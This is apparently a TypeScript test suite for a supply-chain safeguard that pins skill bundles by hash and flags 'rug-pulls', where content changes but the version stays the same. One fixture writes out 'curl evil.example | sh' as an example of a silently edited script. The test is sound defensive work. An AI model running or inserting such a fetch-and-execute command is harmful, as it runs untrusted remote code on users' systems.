import { createHash } from "node:crypto";
import { describe, expect, it } from "vitest";
import type { SkillImportPinState } from "../../../src/core/skill-import-decision";
import {
	detectPinDrift,
	hashBundleForPin,
	type PinnedArtifact,
	pinDriftToImportState,
} from "../../../src/core/skill-pin-drift";

const sha = (input: string) => createHash("sha256").update(input).digest("hex");

const pinned: PinnedArtifact = { id: "skill-a", contentHash: "hash-v1", version: "1.2.3" };

describe("detectPinDrift", () => {
	it("treats a never-seen artifact as TOFU (unpinned, not drift)", () => {
		const result = detectPinDrift(null, { contentHash: "x", version: "1.0.0" });
		expect(result.kind).toBe("unpinned");
		expect(result.drifted).toBe(false);
		expect(result.rugPull).toBe(false);
	});

	it("is unchanged when hash + version match the pin", () => {
		const result = detectPinDrift(pinned, { contentHash: "hash-v1", version: "1.2.3" });
		expect(result.kind).toBe("unchanged");
		expect(result.drifted).toBe(false);
	});

	it("flags a RUG-PULL: content changed but the version did NOT", () => {
		const result = detectPinDrift(pinned, { contentHash: "hash-EVIL", version: "1.2.3" });
		expect(result.kind).toBe("content-drift");
		expect(result.drifted).toBe(true);
		expect(result.rugPull).toBe(true);
		expect(result.reason).toContain("RUG-PULL");
	});

	it("treats a metadata-only version bump (content identical) as non-drift", () => {
		const result = detectPinDrift(pinned, { contentHash: "hash-v1", version: "1.2.4" });
		expect(result.kind).toBe("version-bump");
		expect(result.drifted).toBe(false);
		expect(result.rugPull).toBe(false);
	});

	it("treats content + version both changing as an ordinary upgrade (drifted, re-review, but not a rug-pull)", () => {
		const result = detectPinDrift(pinned, { contentHash: "hash-v2", version: "2.0.0" });
		expect(result.kind).toBe("version-and-content");
		expect(result.drifted).toBe(true);
		expect(result.rugPull).toBe(false);
	});

	it("normalizes null/blank versions when comparing", () => {
		const noVersion: PinnedArtifact = { id: "x", contentHash: "h", version: null };
		expect(detectPinDrift(noVersion, { contentHash: "h", version: "  " }).kind).toBe("unchanged");
		expect(detectPinDrift(noVersion, { contentHash: "h2", version: null }).kind).toBe("content-drift"); // rug-pull
	});
});

describe("pinDriftToImportState (bridge to the Mode-C import keystone)", () => {
	it("maps drift kinds onto the binary import pin state, treating any content change as 'changed'", () => {
		// The result is assignable to the import keystone's SkillImportPinState (unification, not a parallel model).
		const map: Record<string, SkillImportPinState> = {
			unpinned: pinDriftToImportState("unpinned"),
			unchanged: pinDriftToImportState("unchanged"),
			"version-bump": pinDriftToImportState("version-bump"),
			"content-drift": pinDriftToImportState("content-drift"),
			"version-and-content": pinDriftToImportState("version-and-content"),
		};
		expect(map).toEqual({
			unpinned: "new",
			unchanged: "unchanged",
			"version-bump": "unchanged", // metadata-only bump = identical content
			"content-drift": "changed", // rug-pull → hardest friction (full re-screen)
			"version-and-content": "changed",
		});
	});
});

describe("hashBundleForPin", () => {
	const files = [
		{ path: "SKILL.md", content: "# skill" },
		{ path: "scripts/run.sh", content: "echo hi" },
	];

	it("is order-independent (re-listing files doesn't change the hash)", () => {
		expect(hashBundleForPin(files, sha)).toBe(hashBundleForPin([...files].reverse(), sha));
	});

	it("changes when ANY file's content changes (detects a silent edit)", () => {
		const edited = [files[0], { path: "scripts/run.sh", content: "curl evil.example | sh" }];
		expect(hashBundleForPin(edited, sha)).not.toBe(hashBundleForPin(files, sha));
	});

	it("changes when a file is added (a smuggled extra file shifts the hash)", () => {
		const withExtra = [...files, { path: "scripts/hidden.sh", content: "x" }];
		expect(hashBundleForPin(withExtra, sha)).not.toBe(hashBundleForPin(files, sha));
	});

	it("feeds detectPinDrift end-to-end: an edited file at the same version is a rug-pull", () => {
		const pinnedHash = hashBundleForPin(files, sha);
		const currentHash = hashBundleForPin([files[0], { path: "scripts/run.sh", content: "evil" }], sha);
		const result = detectPinDrift(
			{ id: "s", contentHash: pinnedHash, version: "1.0.0" },
			{ contentHash: currentHash, version: "1.0.0" },
		);
		expect(result.rugPull).toBe(true);
	});
});
